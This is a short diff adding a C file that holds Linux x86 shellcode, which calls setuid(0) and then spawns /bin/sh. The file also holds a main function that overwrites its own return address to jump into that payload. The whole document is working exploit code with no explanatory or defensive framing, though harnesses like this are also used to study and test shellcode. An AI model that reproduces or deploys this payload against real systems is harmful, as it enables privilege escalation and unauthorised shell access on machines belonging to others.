@@ -1,0 +1,8 @@
+char shellcode[] = "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+int main()
+{
+        int *ret;
+        ret = (int *)&ret + 2;
+        (*ret) = (int)shellcode;
+}
